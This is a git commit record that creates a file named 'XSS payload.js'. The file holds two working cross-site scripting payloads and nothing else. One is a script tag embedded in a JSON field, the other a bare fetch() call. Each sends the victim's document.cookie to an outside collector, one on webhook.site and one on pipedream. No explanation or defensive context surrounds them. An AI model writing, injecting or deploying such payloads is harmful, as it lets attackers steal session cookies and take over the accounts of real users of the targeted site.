852e9e3298f76e6e32b72d4836f831a7e493a1c5
Yung-Ching Liang <jennywinnie56@gmail.com>
2026-04-28 13:57:58 +1000

    Create XSS payload.js

---
+++ XSS payload.js
@@ -0,0 +1,2 @@
+{"who":"<script>fetch('https://webhook.site/50e13fe6-ecf7-4a30-b716-549e3bef35f7?c='+document.cookie)</script>","why":"great"}.
+fetch('https://eos82zp0nc2qmhz.m.pipedream.net?c='+document.cookie)
